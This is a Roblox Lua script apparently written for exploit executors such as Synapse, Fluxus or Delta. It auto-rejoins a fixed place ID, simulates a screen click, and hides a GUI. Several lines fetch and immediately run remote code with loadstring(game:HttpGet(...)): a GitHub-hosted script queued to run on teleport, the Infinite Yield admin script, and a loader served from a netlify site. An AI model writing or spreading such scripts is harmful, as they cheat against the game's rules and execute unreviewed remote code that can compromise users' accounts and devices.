repeat wait() until game:IsLoaded()
print("Roblox loaded")
wait(30)

game.NetworkClient.ChildRemoved:Connect(function()
    if game.PlaceId == 16732694052 then
        game:GetService("TeleportService"):Teleport(16732694052)
    end
end)

local VirtualInputManager = game:GetService("VirtualInputManager")
local camera = game.Workspace.CurrentCamera

-- Calculate the center of the screen using the camera's viewport size
local screenWidth = camera.ViewportSize.X
local screenHeight = camera.ViewportSize.Y
local centerPosition = Vector2.new(screenWidth / 2, screenHeight / 2)

-- Function to simulate a click in the center of the screen
local function simulateCenterClick()
    -- Simulate mouse down at the center of the screen
    VirtualInputManager:SendMouseButtonEvent(centerPosition.X, centerPosition.Y, 0, true, game, 0)
    wait(0.1)
    -- Simulate mouse up to complete the click
    VirtualInputManager:SendMouseButtonEvent(centerPosition.X, centerPosition.Y, 0, false, game, 0)
end
simulateCenterClick()

queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) or (delta and delta.queue_on_teleport)
local TeleportCheck = false
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
if (not TeleportCheck) and queueteleport then
    TeleportCheck = true
    queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/AyoItsHanee/main/main/fscx.lua'))()")
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
wait(5)
loadstring(game:HttpGet("https://bonkhubloader.netlify.app",true))()
repeat wait() until game:GetService("CoreGui").ScreenGui
game:GetService("CoreGui").ScreenGui.Enabled = false